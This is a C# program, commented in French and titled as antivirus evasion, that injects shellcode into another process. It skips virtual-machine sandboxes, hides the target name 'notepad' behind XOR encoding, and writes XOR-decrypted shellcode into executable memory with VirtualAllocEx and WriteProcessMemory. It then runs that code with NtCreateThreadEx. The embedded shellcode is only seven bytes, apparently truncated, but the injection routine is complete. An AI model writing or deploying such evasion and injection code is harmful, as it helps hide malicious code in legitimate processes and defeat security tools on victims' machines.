using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;

class AdvancedAVEvasion
{
    // Clé XOR pour chiffrer/déchiffrer
    private static uint key = 0x37;

    // Fonction pour XOR-décrypter un tableau de bytes
    private static byte[] xorDecryptBytes(byte[] encrypted)
    {
        byte[] decrypted = new byte[encrypted.Length];
        for (int i = 0; i < encrypted.Length; i++)
        {
            decrypted[i] = (byte)((uint)encrypted[i] ^ key);
        }
        return decrypted;
    }

    // Fonction pour XOR-décrypter une chaîne de caractères
    private static string xorDecryptString(byte[] encrypted)
    {
        StringBuilder decrypted = new StringBuilder();
        for (int i = 0; i < encrypted.Length; i++)
        {
            decrypted.Append((char)((uint)encrypted[i] ^ key));
        }
        return decrypted.ToString();
    }

    // Définition des API Windows (obfuscation partielle)
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress, byte[] buffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern IntPtr NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer);

    static void Main()
    {
        Console.WriteLine("[*] Vérification de l'environnement...");

        // Détection sandbox (on peut améliorer avec d'autres checks)
        if (Process.GetProcessesByName("vmtoolsd").Length > 0)
        {
            Console.WriteLine("[!] Exécution détectée dans une VM, arrêt du programme.");
            return;
        }

        Console.WriteLine("[*] Recherche du processus cible...");
        byte[] notepadEnc = new byte[] { 0x59, 0x58, 0x43, 0x52, 0x47, 0x56, 0x53 };
        string processName = xorDecryptString(notepadEnc);

        Process[] targetProcesses = Process.GetProcessesByName(processName);
        if (targetProcesses.Length == 0)
        {
            Console.WriteLine($"[!] `{processName}.exe` non trouvé, lancement...");
            Process.Start(processName);
            Thread.Sleep(2000);
            targetProcesses = Process.GetProcessesByName(processName);
            if (targetProcesses.Length == 0)
            {
                Console.WriteLine($"[!] Impossible de démarrer `{processName}.exe` !");
                return;
            }
        }

        int targetPid = targetProcesses[0].Id;
        Console.WriteLine($"[+] PID trouvé : {targetPid}");

        byte[] scEnc = new byte[] { 0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7 };
        byte[] shellcode = xorDecryptBytes(scEnc);

        IntPtr hProcess = OpenProcess(0x1F0FFF, false, targetPid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[!] Impossible d'ouvrir le processus !");
            return;
        }

        Console.WriteLine("[*] Allocation mémoire...");
        IntPtr allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

        Console.WriteLine("[*] Injection du shellcode...");
        IntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocatedMemory, shellcode, shellcode.Length, out bytesWritten);

        Console.WriteLine("[*] Exécution du shellcode avec NtCreateThreadEx...");
        IntPtr hThread;
        NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, allocatedMemory, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

        Console.WriteLine($"[+] Shellcode injecté et exécuté dans `{processName}.exe` !");
    }
}
